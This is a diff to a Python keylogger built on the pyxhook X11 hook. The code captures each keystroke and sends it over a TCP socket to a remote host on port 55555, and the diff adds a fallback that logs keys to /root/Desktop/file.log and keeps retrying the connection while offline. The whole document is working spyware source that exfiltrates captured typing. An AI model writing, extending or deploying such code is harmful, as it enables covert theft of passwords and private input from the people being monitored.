@@ -15,7 +15,7 @@ PORT = 55555
 BUFSIZ = 4096
 client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock_addr = (HOST, int(PORT))
-
+log_file='/root/Desktop/file.log'
 
 class HookManager(threading.Thread):
     """ This is the main class. Instantiate it, and you can hand it KeyDown
@@ -134,13 +134,18 @@ class HookManager(threading.Thread):
         # Finally free the context
         self.record_dpy.record_free_context(self.ctx)
 
-    def cancel(self):
-        try:
-            client_sock.send("Connection Closed".encode('utf-8'))
-            client_sock.shutdown(2)
-            client_sock.close()
-        except:
-        	pass
+    def cancel(self,flag,flag_2):
+        if flag and (not flag_2):
+            try:
+                client_sock.send("Connection Closed".encode('utf-8'))
+                client_sock.shutdown(2)
+                client_sock.close()
+            except:
+                pass
+        if not flag:
+            global fob
+            print("Closing File")
+            fob.close()
         self.finished.set()
         self.local_dpy.record_disable_context(self.ctx)
         self.local_dpy.flush()
@@ -434,15 +439,22 @@ class pyxhookkeyevent:
         self.MessageName = MessageName
 
     def __str__(self):
-        try:
-            client_sock.send((self.Key).encode('utf-8'))
-#            self.data = client_sock.recv(1024)
-#            if not self.data:
-#                break
-#            if (self.data).decode('utf-8') == 'grave':
-#                hm.cancel()
-        except:
-        	pass
+        global flag
+        if flag:
+            try:
+                client_sock.send((self.Key).encode('utf-8'))
+#                self.data = client_sock.recv(1024)
+#                if not self.data:
+#                    break
+#                if (self.data).decode('utf-8') == 'grave':
+#                    hm.cancel()
+            except:
+                pass
+        if not flag:
+              global fob
+              fob=open(log_file,'a')
+              fob.write(self.Key)
+              fob.write('\n')
         #client_sock.send('\n'.encode('utf-8'))
         return '\n'.join((
 #            'Window Handle: {s.Window}',
@@ -483,6 +495,19 @@ class pyxhookkeyevent:
 #            'Position: {s.Position}',
 #            'MessageName: {s.MessageName}',)).format(s=self)
 
+flag = False
+flag_2 = False
+
+def connect_socket(sock_addr):
+    global client_sock,flag_2
+    try:
+        client_sock.connect(sock_addr)
+        flag = True
+        return flag
+    except:
+        flag = False
+        flag_2 = True
+        return flag
 
 if __name__ == '__main__':
     hm = HookManager()
@@ -495,16 +520,22 @@ if __name__ == '__main__':
 #    hm.MouseAllButtonsUp = hm.printevent
 #    hm.MouseMovement = hm.printevent
     try:
-        try :
-            client_sock.connect(sock_addr)
-        except:
-            print("Not Connected")
-            pass
-        hm.start()
-        while True:
-            time.sleep(0)
+        flag = connect_socket(sock_addr)
+        if flag == True:
+            print("Connected.\nSending To Server")
+            if flag_2 == True:
+                hm.cancel(flag,flag_2)
+            hm.start()
+            while True:
+                time.sleep(0)
+        elif flag == False:
+            print("Not Connected.\nWriting To File")
+            hm.start()
+            while (not flag):
+                flag = connect_socket(sock_addr)
+                time.sleep(0)
     except KeyboardInterrupt:
-        hm.cancel()
+        hm.cancel(flag,flag_2)
 #    hm.start()
 #    time.sleep(10)
 #    hm.cancel()
